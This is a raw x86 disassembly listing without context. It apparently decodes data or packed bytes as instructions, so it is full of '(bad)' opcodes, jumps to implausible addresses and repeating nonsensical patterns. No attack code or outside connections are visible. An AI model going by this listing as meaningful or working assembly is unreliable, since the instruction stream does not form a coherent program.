  40282c:	bound  eax,QWORD PTR [ecx+0x40]
  40282f:	add    eax,0x4140
  402834:	and    eax,0x40400062
  402839:	add    eax,0x84404340
  40283e:	int3   
  40283f:	js     0x402841
  402841:	inc    ecx
  402842:	adc    BYTE PTR [edx+0xf],ah
  402845:	arpl   WORD PTR [ebp+0x4],si
  402848:	and    al,0x0
  40284a:	aam    0x2a
  40284c:	test   al,0x5f
  40284e:	nop
  40284f:	inc    eax
  402850:	ret    0x8329
  402853:	data16 adc ch,BYTE PTR [eax+0x2e404049]
  40285a:	or     BYTE PTR [esi+0x40ca40bf],0x45
  402861:	dec    esp
  402862:	retf   
  402863:	bound  edi,QWORD PTR [edi+0x3540c02a]
  402869:	add    BYTE PTR [edi+0x7c],bl
  40286c:	mov    esi,0x2ed71241
  402871:	xor    BYTE PTR [edx-0x3ac36b48],bh
  402877:	mov    ds:0x40414000,al
  40287c:	inc    ebx
  40287d:	bound  ax,DWORD PTR ds:0x40434100
  402884:	add    eax,0x40054062
  402889:	bound  eax,QWORD PTR [ecx+0x40]
  40288c:	inc    ebx
  40288d:	inc    eax
  40288e:	add    eax,0x25405841
  402893:	bound  eax,QWORD PTR [eax+0x43]
  402896:	inc    eax
  402897:	adc    BYTE PTR [eax-0x20],al
  40289a:	and    DWORD PTR [edx+0x44],0x32e74f24
  4028a1:	xchg   DWORD PTR [ebx+0x4f48492f],eax
  4028a7:	xor    eax,0x30b84e3a
  4028ac:	cmp    al,0x2a
  4028ae:	aas    
  4028af:	sub    eax,0xb8458040
  4028b4:	pop    eax
  4028b5:	pop    edx
  4028b6:	pop    es
  4028b7:	mov    gs,WORD PTR [ebx]
  4028b9:	sub    DWORD PTR [ebp+eax*1+0x68],eax
  4028bd:	xor    eax,0x38408148
  4028c2:	and    BYTE PTR [edi+0x77624151],al
  4028c8:	inc    eax
  4028c9:	inc    ecx
  4028ca:	inc    ebx
  4028cb:	inc    eax
  4028cc:	add    eax,0x43406262
  4028d1:	inc    ecx
  4028d2:	adc    BYTE PTR [eax],al
  4028d4:	inc    eax
  4028d5:	add    eax,0x43000562
  4028da:	add    BYTE PTR [ecx+0x40],al
  4028dd:	inc    eax
  4028de:	add    eax,0x400062
  4028e3:	inc    ebx
  4028e4:	inc    eax
  4028e5:	js     0x402928
  4028e7:	inc    ecx
  4028e8:	bound  eax,QWORD PTR [eax+0x23]
  4028eb:	sbb    BYTE PTR [edi+0x17],0x52
  4028ef:	push   eax
  4028f0:	test   eax,0xba353652
  4028f5:	das    
  4028f6:	jne    0x40291c
  4028f8:	dec    esp
  4028f9:	aam    0x40
  4028fb:	inc    edi
  4028fc:	and    DWORD PTR [edx+0x30],0x1164adbb
  402903:	add    BYTE PTR [edx+0xf981105],0x2a
  40290a:	and    dh,ch
  40290c:	retf   
  40290d:	int    0xb7
  40290f:	cmp    DWORD PTR [esi+edx*4+0x41054062],esi
  402916:	add    BYTE PTR [ebx+0x40],al
  402919:	inc    eax
  40291a:	inc    ecx
  40291b:	inc    eax
  40291c:	inc    eax
  40291d:	bound  eax,QWORD PTR ds:0x5624300
  402923:	add    BYTE PTR [eax+0x40],al
  402926:	add    BYTE PTR [ecx+0x43],al
  402929:	add    BYTE PTR [eax+0x41],al
  40292c:	add    eax,0x40436200
  402931:	inc    eax
  402932:	add    eax,0x836d7262
  402937:	xchg   edi,eax
  402938:	inc    ecx
  402939:	call   0x9a8802a0
  40293e:	mov    edx,0x52ce4a
  402943:	outs   dx,DWORD PTR ds:[esi]
  402944:	outs   dx,BYTE PTR ds:[esi]
  402945:	xchg   ecx,eax
  402946:	xchg   ebx,eax
  402947:	imul   ebp,DWORD PTR fs:[ecx-0x3cbf3c79],0xb0944890
  402952:	dec    eax
  402953:	sub    edi,DWORD PTR [eax-0x7e]
  402956:	in     eax,dx
  402957:	and    al,0x90
  402959:	nop
  40295a:	add    eax,0x47211c3f
  40295f:	push   ebp
  402960:	bound  edi,QWORD PTR [edx+0x5e4069cb]
  402966:	inc    ebx
  402967:	mov    dl,0x41
  402969:	inc    eax
  40296a:	add    eax,0x41624340
  40296f:	test   BYTE PTR [eax],al
  402971:	and    eax,0x404043
  402976:	add    BYTE PTR ds:0x626210,al
  40297c:	add    eax,0x43404140
  402981:	inc    eax
  402982:	inc    ecx
  402983:	add    eax,0x10664062
  402988:	inc    ebx
  402989:	(bad)  
  40298a:	mul    BYTE PTR [ecx+edx*2+0x68]
  40298e:	sub    BYTE PTR [eax],al
  402990:	cld    
  402991:	test   al,0xc5
  402993:	sysexit 
  402995:	outs   dx,DWORD PTR ds:[esi]
  402996:	and    al,0x60
  402998:	push   esi
  402999:	lahf   
  40299a:	dec    edi
  40299b:	enter  0xe171,0x40
  40299f:	fwait
  4029a0:	inc    ebx
  4029a1:	sub    eax,DWORD PTR [eax+0x62]
  4029a4:	mov    edx,0x41cc05d9
  4029a9:	inc    eax
  4029aa:	add    BYTE PTR [eax],al
  4029ac:	add    BYTE PTR [eax+0x40],al
  4029af:	inc    ebx
  4029b0:	bound  eax,QWORD PTR [eax]
  4029b2:	inc    eax
  4029b3:	inc    eax
  4029b4:	add    eax,0x62434162
  4029b9:	inc    eax
  4029ba:	js     0x4029cc
  4029bc:	inc    ecx
  4029bd:	add    eax,0x5404325
  4029c2:	bound  eax,QWORD PTR [eax+0x40]
  4029c5:	inc    ecx
  4029c6:	inc    ebx
  4029c7:	and    al,0x83
  4029c9:	(bad)  [edi+0x41]
  4029cc:	retw   
  4029ce:	shr    DWORD PTR [edx],0x7d
  4029d1:	sub    DWORD PTR [eax+0x40],0xffffffbc
  4029d5:	inc    ecx
  4029d6:	xchg   DWORD PTR [ecx+eax*4],ebp
  4029d9:	xchg   edx,eax
  4029da:	bound  esi,QWORD PTR [ebx+eiz*2]
  4029dd:	push   esp
  4029de:	mov    al,BYTE PTR [eax+0x2b]
  4029e1:	jae    0x402a0a
  4029e3:	std    
  4029e4:	xor    eax,0x43624125
  4029e9:	add    BYTE PTR [eax],dl
  4029eb:	inc    eax
  4029ec:	add    BYTE PTR ds:0x62410040,al
  4029f2:	inc    eax
  4029f3:	add    BYTE PTR [ebx-0x34],al
  4029f6:	inc    eax
  4029f7:	add    eax,0x78434040
  4029fc:	bound  eax,QWORD PTR [ecx+0x78]
  4029ff:	add    eax,0x62404043
  402a04:	(bad)  
  402a05:	es aaa 
  402a07:	ins    DWORD PTR es:[edi],dx
  402a08:	sub    BYTE PTR [ebx+0x644f69c3],0xc4
  402a0f:	xor    DWORD PTR [ebx-0x44],0xae443dbf
  402a16:	dec    eax
  402a17:	pop    eax
  402a18:	add    DWORD PTR [eax-0x5bb57741],0x71
  402a1f:	and    DWORD PTR [edx+0xc98bf63],0x930d40fa
  402a29:	bound  edx,QWORD PTR [eax+0x41]
  402a2c:	inc    eax
  402a2d:	add    eax,0x43436240
  402a32:	add    eax,0x62004040
  402a37:	inc    eax
  402a38:	add    BYTE PTR [ecx+0x40],al
  402a3b:	inc    ebx
  402a3c:	test   BYTE PTR ds:0x58054041,ah
  402a42:	inc    eax
  402a43:	inc    eax
  402a44:	bound  eax,QWORD PTR [eax+0x66]
  402a47:	inc    ecx
  402a48:	inc    eax
  402a49:	add    eax,0xaccb6000
  402a4e:	jp     0x4029d9
  402a50:	pop    edi
  402a51:	mov    bl,0xc5
  402a53:	jnp    0x402a95
  402a55:	sub    eax,0x20a13124
  402a5a:	inc    esp
  402a5b:	fld    QWORD PTR [eax-0x3ffebfe7]
  402a61:	inc    esi
  402a62:	mov    DWORD PTR [esi],edx
  402a64:	add    BYTE PTR [eax],al
  402a66:	inc    ebx
  402a67:	inc    eax
  402a68:	bound  eax,QWORD PTR ds:0x25404110
  402a6e:	add    ah,cl
  402a70:	inc    ebx
  402a71:	add    eax,0x40402562
  402a76:	add    BYTE PTR [eax+0x40],al
  402a79:	inc    ecx
  402a7a:	inc    ecx
  402a7b:	add    eax,0x78434025
  402a80:	bound  eax,QWORD PTR [eax-0x7c]
  402a83:	inc    eax
  402a84:	inc    ecx
  402a85:	sub    esp,DWORD PTR [edi+ebp*1-0x38]
  402a89:	or     BYTE PTR [edi+0x68],0x4c
  402a8d:	inc    eax
  402a8e:	pop    es
  402a8f:	loop   0x402a12
  402a91:	jae    0x402a18
  402a93:	push   esi
  402a94:	outs   dx,BYTE PTR ds:[esi]
  402a95:	inc    esp
  402a96:	mov    ds:0xc39044a8,eax
  402a9b:	inc    ecx
  402a9c:	inc    eax
  402a9d:	inc    eax
  402a9e:	inc    ebx
  402a9f:	int3   
  402aa0:	add    BYTE PTR ds:0x56240,al
  402aa6:	inc    ebx
  402aa7:	inc    eax
  402aa8:	inc    eax
  402aa9:	add    BYTE PTR [ecx+0x62],al
  402aac:	bound  eax,QWORD PTR [eax]
  402aae:	int3   
  402aaf:	inc    eax
  402ab0:	inc    ebx
  402ab1:	add    eax,0x43624041
  402ab6:	adc    BYTE PTR [ecx+0x5],al
  402ab9:	inc    eax
  402aba:	inc    edi
  402abb:	or     eax,0x8240d740
  402ac0:	retf   
  402ac1:	scas   al,BYTE PTR es:[edi]
  402ac2:	and    BYTE PTR [ebp+ebp*1-0x7cd1921f],ch
  402ac9:	lds    esp,FWORD PTR [edx+0x62]
  402acc:	int3   
  402acd:	or     al,BYTE PTR [eax+0x2e]
  402ad0:	bound  eax,QWORD PTR [ebx+0x40]
  402ad3:	adc    BYTE PTR ds:0x4158cc40,al
  402ad9:	inc    ebx
  402ada:	bound  eax,QWORD PTR [ecx+0x40]
  402add:	add    eax,0x4140
  402ae2:	and    eax,0x40400062
  402ae7:	add    eax,0x84404340
  402aec:	int3   
  402aed:	js     0x402aef
  402aef:	inc    ecx
  402af0:	adc    BYTE PTR [edx+0xf],ah
  402af3:	mov    al,ds:0x6244a8b1
  402af8:	das    
  402af9:	add    DWORD PTR cs:[ebx+0x4820113c],edx
  402b00:	xchg   ebx,eax
  402b01:	inc    eax
  402b02:	mov    ebp,0x158c4782
  402b07:	adc    BYTE PTR [ecx+ebp*1+0x7f],dl
  402b0b:	in     eax,0x3c
  402b0d:	or     eax,0x402ecba8
  402b12:	or     DWORD PTR [edi+0x50],0x42
  402b16:	adc    BYTE PTR [eax+0x3],al
  402b19:	daa    
  402b1a:	jno    0x402b62
  402b1c:	xor    BYTE PTR [esp+ecx*2+0x1c0e7a1],al
  402b23:	xor    ecx,DWORD PTR [ebp+0x58]
  402b26:	inc    ecx
  402b27:	or     DWORD PTR [eax+eax*2+0x73],0x40414000
  402b2f:	inc    ebx
  402b30:	bound  ax,DWORD PTR ds:0x40434100
  402b37:	add    eax,0x40054062
  402b3c:	bound  eax,QWORD PTR [ecx+0x40]
  402b3f:	inc    ebx
  402b40:	inc    eax
  402b41:	add    eax,0x25405841
  402b46:	bound  eax,QWORD PTR [eax+0x43]
  402b49:	inc    eax
  402b4a:	adc    BYTE PTR [eax-0x54],ah
  402b4d:	push   esp
  402b4e:	jge    0x402b93
  402b50:	sub    al,0x32
  402b52:	test   BYTE PTR [ecx+0x42c81092],bh
  402b58:	icebp  
  402b59:	inc    eax
  402b5a:	xor    al,al
  402b5c:	mov    edi,0x8558624e
  402b61:	and    DWORD PTR [ebx],ecx
  402b63:	push   ebp
  402b64:	je     0x402b2b
  402b66:	jg     0x402bd1
  402b68:	dec    esp
  402b69:	inc    eax
  402b6a:	xor    DWORD PTR [ebx],0x407ccdc2
  402b70:	inc    ecx
  402b71:	inc    ebx
  402b72:	inc    eax
  402b73:	add    eax,0x43406262
  402b78:	inc    ecx
  402b79:	adc    BYTE PTR [eax],al
  402b7b:	inc    eax
  402b7c:	add    eax,0x43000562
  402b81:	add    BYTE PTR [ecx+0x40],al
  402b84:	inc    eax
  402b85:	add    eax,0x400062
  402b8a:	inc    ebx
  402b8b:	inc    eax
  402b8c:	js     0x402bcf
  402b8e:	inc    ecx
  402b8f:	bound  eax,QWORD PTR [eax+0x77]
  402b92:	bound  ebp,QWORD PTR ds:0x12620069
  402b98:	push   edx
  402b99:	xor    al,0xa4
  402b9b:	inc    eax
  402b9c:	add    eax,0x214538b9
  402ba1:	inc    eax
  402ba2:	or     eax,0x24c08960
  402ba7:	and    bh,BYTE PTR [eax]
  402ba9:	inc    ecx
  402baa:	bound  eax,QWORD PTR [eax-0x7d]
  402bad:	mov    WORD PTR [esi-0x2b],ss
  402bb0:	adc    eax,0x6240407c
  402bb5:	dec    esi
  402bb6:	je     0x402b85
  402bb8:	retf   
  402bb9:	ret    
  402bba:	std    
  402bbb:	jnp    0x402b3e
  402bbd:	inc    eax
  402bbe:	push   ds
  402bbf:	inc    eax
  402bc0:	inc    esi
  402bc1:	dec    eax
  402bc2:	bound  eax,QWORD PTR [eax+0x5]
  402bc5:	inc    ecx
  402bc6:	add    BYTE PTR [ebx+0x40],al
  402bc9:	inc    eax
  402bca:	inc    ecx
  402bcb:	inc    eax
  402bcc:	inc    eax
  402bcd:	bound  eax,QWORD PTR ds:0x5624300
  402bd3:	add    BYTE PTR [eax+0x40],al
  402bd6:	add    BYTE PTR [ecx+0x43],al
  402bd9:	add    BYTE PTR [eax+0x41],al
  402bdc:	add    eax,0x40436200
  402be1:	inc    eax
  402be2:	add    eax,0xaf404262
  402be7:	push   edi
  402be8:	jp     0x402c14
  402bea:	push   ecx
  402beb:	or     ah,dh
  402bed:	cmp    BYTE PTR [eax+0x38],ah
  402bf0:	bound  eax,QWORD PTR [ecx-0x3d]
  402bf3:	retf   
  402bf4:	fild   WORD PTR [eax+0x5]
  402bf7:	add    DWORD PTR [eax+0x6e],0xffffffcb
  402bfb:	inc    eax
  402bfc:	xor    DWORD PTR [eax],0x6c
  402bff:	mov    ah,bl
  402c01:	in     al,0x14
  402c03:	mov    al,ds:0x50034075
  402c08:	jle    0x402c5c
  402c0a:	push   edx
  402c0b:	sbb    esi,0x38822270
  402c11:	sub    al,cl
  402c13:	dec    ecx
  402c14:	bound  eax,QWORD PTR [eax-0x7f]
  402c17:	push   ebp
  402c18:	bound  eax,QWORD PTR [ecx+0x50]
  402c1b:	inc    ecx
  402c1c:	inc    eax
  402c1d:	add    eax,0x41624340
  402c22:	test   BYTE PTR [eax],al
  402c24:	and    eax,0x404043
  402c29:	add    BYTE PTR ds:0x626210,al
  402c2f:	add    eax,0x43404140
  402c34:	inc    eax
  402c35:	inc    ecx
  402c36:	add    eax,0x10664062
  402c3b:	inc    ebx
  402c3c:	bound  esp,QWORD PTR [ebx]
  402c3e:	mov    ebx,0x404a1940
  402c43:	sub    dh,BYTE PTR ds:0x1721f2c
  402c49:	push   esp
  402c4a:	sub    al,0x41
  402c4c:	ss clc 
  402c4e:	aas    
  402c4f:	inc    eax
  402c50:	in     al,0xbf
  402c52:	loopne 0x402c95
  402c54:	test   al,0x4c
  402c56:	leave  
  402c57:	jp     0x402bdb
  402c59:	sbb    BYTE PTR [esi+eiz*4],bh
  402c5c:	add    dl,BYTE PTR [ecx]
  402c5e:	lods   al,BYTE PTR ds:[esi]
  402c5f:	inc    eax
  402c60:	and    eax,DWORD PTR ds:0x4041cc
  402c66:	add    BYTE PTR [eax],al
  402c68:	inc    eax
  402c69:	inc    eax
  402c6a:	inc    ebx
  402c6b:	bound  eax,QWORD PTR [eax]
  402c6d:	inc    eax
  402c6e:	inc    eax
  402c6f:	add    eax,0x62434162
  402c74:	inc    eax
  402c75:	js     0x402c87
  402c77:	inc    ecx
  402c78:	add    eax,0x5404325
  402c7d:	bound  eax,QWORD PTR [eax+0x40]
  402c80:	inc    ecx
  402c81:	inc    ebx
  402c82:	adc    BYTE PTR [ecx-0x54],ah
  402c85:	sub    ch,ah
  402c87:	fdiv   DWORD PTR [esp+eax*2]
  402c8a:	dec    ebx
  402c8b:	stos   DWORD PTR es:[edi],eax
  402c8c:	add    esi,DWORD PTR fs:[edi]
  402c8f:	jmp    0x402cd1
  402c91:	add    DWORD PTR [edi],edi
  402c93:	add    BYTE PTR [eax+eiz*1+0x41257e13],0x62
  402c9b:	inc    ebx
  402c9c:	add    BYTE PTR [eax],dl
  402c9e:	inc    eax
  402c9f:	add    BYTE PTR ds:0x62410040,al
  402ca5:	inc    eax
  402ca6:	add    BYTE PTR [ebx-0x34],al
  402ca9:	inc    eax
  402caa:	add    eax,0x78434040
  402caf:	bound  eax,QWORD PTR [ecx+0x78]
  402cb2:	add    eax,0x62404043
  402cb7:	sub    BYTE PTR [esi+0x8],al
  402cba:	jae    0x402ce0
  402cbc:	push   eax
  402cbd:	xor    eax,0x44004056
  402cc2:	inc    esp
  402cc3:	push   ebp
  402cc4:	or     al,0x41
  402cc6:	xlat   BYTE PTR ds:[ebx]
  402cc7:	cmc    
  402cc8:	mov    ebx,0x540414d
  402ccd:	inc    eax
  402cce:	bound  eax,QWORD PTR [ebx+0x43]
  402cd1:	add    eax,0x62004040
  402cd6:	inc    eax
  402cd7:	add    BYTE PTR [ecx+0x40],al
  402cda:	inc    ebx
  402cdb:	test   BYTE PTR ds:0x58054041,ah
  402ce1:	inc    eax
  402ce2:	inc    eax
  402ce3:	bound  eax,QWORD PTR [eax+0x66]
  402ce6:	inc    ecx
  402ce7:	inc    eax
  402ce8:	add    eax,0x69874200
  402ced:	mov    al,0xd6
  402cef:	pop    edx
  402cf0:	add    eax,0x7db87153
  402cf5:	inc    ecx
  402cf6:	sbb    eax,0x9444c446
  402cfb:	std    
  402cfc:	xor    al,0x5
  402cfe:	jecxz  0x402d31
  402d00:	xchg   DWORD PTR [ecx+0x68],eax
  402d03:	bound  eax,QWORD PTR [esp+ecx*4-0x6b]
  402d07:	inc    ecx
  402d08:	loopne 0x402d37
  402d0a:	xchg   DWORD PTR [edx+eiz*1+0x63],ecx
  402d0e:	dec    esi
  402d0f:	rol    DWORD PTR [edx],cl
  402d11:	arpl   WORD PTR [eax+eiz*1],di
  402d14:	data16 cmc 
  402d16:	(bad)  
  402d17:	adc    dh,BYTE PTR [eax]
  402d19:	je     0x402c9e
  402d1b:	sbb    ebx,DWORD PTR [eax-0x3a]
  402d1e:	jnp    0x402d8d
  402d20:	pop    ss
  402d21:	add    BYTE PTR [eax],al
  402d23:	inc    ebx
  402d24:	inc    eax
  402d25:	bound  eax,QWORD PTR ds:0x25404110
  402d2b:	add    ah,cl
  402d2d:	inc    ebx
  402d2e:	add    eax,0x40402562
  402d33:	add    BYTE PTR [eax+0x40],al
  402d36:	inc    ecx
  402d37:	inc    ecx
  402d38:	add    eax,0x78434025
  402d3d:	bound  eax,QWORD PTR [eax-0x7c]
  402d40:	inc    eax
  402d41:	inc    ecx
  402d42:	test   al,0x1d
  402d44:	test   al,0x55
  402d46:	dec    edi
  402d47:	inc    edi
  402d48:	jae    0x402ccb
  402d4a:	dec    ebx
  402d4b:	push   0x10
  402d4d:	cdq    
  402d4e:	inc    ecx
  402d4f:	outs   dx,BYTE PTR ds:[esi]
  402d50:	jno    0x402dc2
  402d52:	and    ebp,DWORD PTR [edx]
  402d54:	mov    BYTE PTR [esp+eax*2],bh
  402d57:	jnp    0x402d9e
  402d59:	add    DWORD PTR [ebx+0x41],0xffffff97
  402d5d:	pop    es
  402d5e:	cmp    BYTE PTR [edx+0x43404041],ch
  402d64:	int3   
  402d65:	add    BYTE PTR ds:0x56240,al
  402d6b:	inc    ebx
  402d6c:	inc    eax
  402d6d:	inc    eax
  402d6e:	add    BYTE PTR [ecx+0x62],al
  402d71:	bound  eax,QWORD PTR [eax]
  402d73:	int3   
  402d74:	inc    eax
  402d75:	inc    ebx
  402d76:	add    eax,0x43624041
  402d7b:	adc    BYTE PTR [ecx+0x5],al
  402d7e:	inc    eax
  402d7f:	icebp  
  402d80:	jp     0x402d52
  402d82:	cmp    BYTE PTR [edx+0x1c],bl
  402d85:	ret    
  402d86:	xor    al,BYTE PTR [ecx-0x7a]
  402d89:	adc    DWORD PTR [ebp-0x3b],eax
  402d8c:	arpl   WORD PTR [ebx+ecx*4-0x4f],cx
  402d90:	sub    eax,esi
  402d92:	xchg   DWORD PTR [edx+0x537202c1],esi
  402d98:	cs inc ebx
  402d9a:	inc    esp
  402d9b:	leave  
  402d9c:	test   al,0xcb
  402d9e:	push   es
  402d9f:	pop    edi
  402da0:	sub    dl,BYTE PTR [edx+0x4b]
  402da3:	bound  edx,QWORD PTR [eax]
  402da5:	inc    edi
  402da6:	test   al,0x42
  402da8:	add    ch,BYTE PTR [edx-0x2d]
  402dab:	sub    cl,BYTE PTR [eax+0x6e]
  402dae:	pop    edx
  402daf:	sbb    esi,DWORD PTR [edi]
  402db1:	inc    ebx
  402db2:	inc    DWORD PTR [ebp+0x62]
  402db5:	inc    ebx
  402db6:	inc    eax
  402db7:	adc    BYTE PTR ds:0x4158cc40,al
  402dbd:	inc    ebx
  402dbe:	bound  eax,QWORD PTR [ecx+0x40]
  402dc1:	add    eax,0x4140
  402dc6:	and    eax,0x40400062
  402dcb:	add    eax,0x84404340
  402dd0:	int3   
  402dd1:	js     0x402dd3
  402dd3:	inc    ecx
  402dd4:	adc    BYTE PTR [edx+0xf],ah
  402dd7:	inc    ecx
  402dd8:	js     0x402d83
  402dda:	inc    ebx
  402ddb:	inc    edi
  402ddc:	lock test al,0x25
  402ddf:	jns    0x402e43
  402de1:	call   0x1099adf7
  402de6:	xchg   edx,eax
  402de7:	lods   al,BYTE PTR ds:[esi]
  402de8:	sub    BYTE PTR [esi+0x4c3508ff],ah
  402dee:	dec    eax
  402def:	bound  esp,QWORD PTR [eax+0x47c40e3b]
  402df5:	cmp    ebx,DWORD PTR [ebx+0x44]
  402df8:	bound  eax,QWORD PTR [ebp-0x1e61750f]
  402dfe:	add    BYTE PTR [eax+0x41],al
  402e01:	inc    eax
  402e02:	inc    ebx
  402e03:	bound  ax,DWORD PTR ds:0x40434100
  402e0a:	add    eax,0x40054062
  402e0f:	bound  eax,QWORD PTR [ecx+0x40]
  402e12:	inc    ebx
  402e13:	inc    eax
  402e14:	add    eax,0x25405841
  402e19:	bound  eax,QWORD PTR [eax+0x43]
  402e1c:	inc    eax
  402e1d:	adc    BYTE PTR [edi+0x475e0540],al
  402e23:	outs   dx,BYTE PTR ds:[esi]
  402e24:	adc    BYTE PTR [eax+0x40],al
  402e27:	sub    BYTE PTR [edi+0x3d58b01a],al
  402e2d:	inc    eax
  402e2e:	inc    eax
  402e2f:	pop    ebx
  402e30:	inc    eax
  402e31:	mov    edi,DWORD PTR [edx+0x7]
  402e34:	test   al,0x40
  402e36:	mov    al,0x41
  402e38:	shl    BYTE PTR [edx+0x43],0x53
  402e3c:	inc    eax
  402e3d:	inc    ecx
  402e3e:	out    0x99,eax
  402e40:	pop    ss
  402e41:	pop    es
  402e42:	mov    al,0x3
  402e44:	inc    eax
  402e45:	inc    ecx
  402e46:	inc    ebx
  402e47:	inc    eax
  402e48:	add    eax,0x43406262
  402e4d:	inc    ecx
  402e4e:	adc    BYTE PTR [eax],al
  402e50:	inc    eax
  402e51:	add    eax,0x43000562
  402e56:	add    BYTE PTR [ecx+0x40],al
  402e59:	inc    eax
  402e5a:	add    eax,0x400062
  402e5f:	inc    ebx
  402e60:	inc    eax
  402e61:	js     0x402ea4
  402e63:	inc    ecx
  402e64:	bound  eax,QWORD PTR [eax+0x1]
  402e67:	inc    ecx
  402e68:	pop    edx
  402e69:	shl    BYTE PTR [edx+0x7f],1
  402e6c:	sub    al,0xeb
  402e6e:	add    eax,eax
  402e70:	mov    esi,0x8ae20161
  402e75:	and    BYTE PTR es:[ebp-0x44],al
  402e79:	or     BYTE PTR [edi+0x288151d1],al
  402e7f:	xchg   ebp,eax
  402e81:	std    
  402e82:	dec    eax
  402e83:	push   0xfffffff2
  402e85:	push   eax
  402e86:	inc    eax
  402e87:	bound  eax,QWORD PTR [edi+0x31a20d4e]
  402e8d:	bound  eax,QWORD PTR [eax+0x5]
  402e90:	inc    ecx
  402e91:	add    BYTE PTR [ebx+0x40],al
  402e94:	inc    eax
  402e95:	inc    ecx
  402e96:	inc    eax
  402e97:	inc    eax
  402e98:	bound  eax,QWORD PTR ds:0x5624300
  402e9e:	add    BYTE PTR [eax+0x40],al
  402ea1:	add    BYTE PTR [ecx+0x43],al
  402ea4:	add    BYTE PTR [eax+0x41],al
  402ea7:	add    eax,0x40436200
  402eac:	inc    eax
  402ead:	add    eax,0x342a8162
  402eb2:	inc    ecx
  402eb3:	loopne 0x402e80
  402eb5:	push   es
  402eb6:	push   eax
  402eb7:	fld    QWORD PTR [edi+0x40]
  402eba:	xchg   edx,eax
  402ebb:	xor    al,0x51
  402ebd:	cmp    dh,bh
  402ebf:	add    eax,0xaba84271
  402ec4:	xor    eax,0x987f97a1
  402ec9:	inc    ebp
  402eca:	pop    edx
  402ecb:	mov    esp,0x89484143
  402ed0:	bound  ebp,QWORD PTR [edx*8+0x72b2b05a]
  402ed7:	inc    ecx
  402ed8:	inc    eax
  402ed9:	add    eax,0x41624340
  402ede:	test   BYTE PTR [eax],al
  402ee0:	and    eax,0x404043
  402ee5:	add    BYTE PTR ds:0x626210,al
  402eeb:	add    eax,0x43404140
  402ef0:	inc    eax
  402ef1:	inc    ecx
  402ef2:	add    eax,0x10664062
  402ef7:	inc    ebx
  402ef8:	bound  edi,QWORD PTR ds:0xbfc97d54
  402efe:	cmp    eax,0xfc803428
  402f03:	cs dec eax
  402f05:	push   0x2c5096c3
  402f0a:	add    DWORD PTR [ebp+0x31504422],edi
  402f10:	jo     0x402f5e
  402f12:	and    BYTE PTR [ebx-0x2b],ah
  402f15:	mov    esp,0x812577c9
  402f1a:	jecxz  0x402f69
  402f1c:	int    0x6a
  402f1e:	dec    eax
  402f1f:	imul   edx,DWORD PTR [ecx+0xf],0x60
  402f23:	cwde   
  402f24:	outs   dx,DWORD PTR ds:[esi]
  402f25:	push   ecx
  402f26:	add    eax,0x41cc053f
  402f2b:	inc    eax
  402f2c:	add    BYTE PTR [eax],al
  402f2e:	add    BYTE PTR [eax+0x40],al
  402f31:	inc    ebx
  402f32:	bound  eax,QWORD PTR [eax]
  402f34:	inc    eax
  402f35:	inc    eax
  402f36:	add    eax,0x62434162
  402f3b:	inc    eax
  402f3c:	js     0x402f4e
  402f3e:	inc    ecx
  402f3f:	add    eax,0x5404325
  402f44:	bound  eax,QWORD PTR [eax+0x40]
  402f47:	inc    ecx
  402f48:	inc    ebx
  402f49:	mov    cl,0x5
  402f4b:	add    BYTE PTR [ebx+0x42],al
  402f4e:	cmp    al,0xcb
  402f50:	pop    edx
  402f51:	or     DWORD PTR [ebx+0x6752c85c],edi
  402f57:	dec    ebp
  402f58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f59:	mov    cl,0x69
  402f5b:	daa    
  402f5c:	and    eax,0x436241
  402f61:	adc    BYTE PTR [eax+0x0],al
  402f64:	add    eax,0x62410040
  402f69:	inc    eax
  402f6a:	add    BYTE PTR [ebx-0x34],al
  402f6d:	inc    eax
  402f6e:	add    eax,0x78434040
  402f73:	bound  eax,QWORD PTR [ecx+0x78]
  402f76:	add    eax,0x62404043
  402f7b:	lods   al,BYTE PTR ds:[esi]
  402f7c:	xchg   edx,eax
  402f7d:	inc    esp
  402f7e:	inc    edx
  402f7f:	xchg   edx,eax
  402f80:	or     eax,0x8cb5b87
  402f85:	lods   al,BYTE PTR ds:[esi]
  402f86:	aam    0x0
  402f88:	xchg   ebx,eax
  402f89:	push   esi
  402f8a:	test   al,0x15
  402f8c:	pop    edx
  402f8d:	ins    DWORD PTR es:[edi],dx
  402f8e:	adc    eax,0x61814ea6
  402f93:	push   ebx
  402f94:	lds    eax,FWORD PTR [edi+0x29]
  402f97:	pop    ebx
  402f98:	shl    BYTE PTR [ebp+0x5e],cl
  402f9b:	add    eax,DWORD PTR [edi+0x41a5401c]
  402fa1:	inc    eax
  402fa2:	add    eax,0x43436240
  402fa7:	add    eax,0x62004040
  402fac:	inc    eax
  402fad:	add    BYTE PTR [ecx+0x40],al
  402fb0:	inc    ebx
  402fb1:	test   BYTE PTR ds:0x58054041,ah
  402fb7:	inc    eax
  402fb8:	inc    eax
  402fb9:	bound  eax,QWORD PTR [eax+0x66]
  402fbc:	inc    ecx
  402fbd:	inc    eax
  402fbe:	add    eax,0x6880ef00
  402fc3:	addr16 adc ecx,ebx
  402fc6:	inc    eax
  402fc7:	icebp  
  402fc8:	cmp    BYTE PTR [edx],ah
  402fca:	xchg   esi,eax
  402fcb:	mov    BYTE PTR [esi],bh
  402fcd:	or     BYTE PTR [eax+0x53],al
  402fd0:	inc    edx
  402fd1:	(bad)  
  402fd2:	call   0x389fc2af
  402fd7:	jecxz  0x40300a
  402fd9:	add    DWORD PTR [ebx+0x67],edi
  402fdc:	mov    al,ds:0x471dac21
  402fe1:	enter  0x42fa,0x5a
  402fe5:	fadd   DWORD PTR [esi+eax*4-0x22]
  402fe9:	add    DWORD PTR [edi],0xe7bcc5c0
  402fef:	inc    ebp
  402ff0:	ss jl  0x40302f
  402ff3:	loope  0x402f7c
  402ff5:	test   al,0x0
  402ff7:	add    BYTE PTR [ebx+0x40],al
  402ffa:	bound  eax,QWORD PTR ds:0x25404110
  403000:	add    ah,cl
  403002:	inc    ebx
  403003:	add    eax,0x40402562
  403008:	add    BYTE PTR [eax+0x40],al
  40300b:	inc    ecx
  40300c:	inc    ecx
  40300d:	add    eax,0x78434025
  403012:	bound  eax,QWORD PTR [eax-0x7c]
  403015:	inc    eax
  403016:	inc    ecx
  403017:	and    al,0x4a
  403019:	push   edx
  40301a:	add    esp,DWORD PTR ds:0xbf101a10
  403020:	pop    ebp
  403021:	push   ecx
  403022:	leave  
  403023:	lods   al,BYTE PTR ds:[esi]
  403024:	jmp    0xadec7c67
  403029:	inc    ecx
  40302a:	cmp    DWORD PTR [ecx],0x3d42bfdb
  403030:	or     edi,DWORD PTR [ecx]
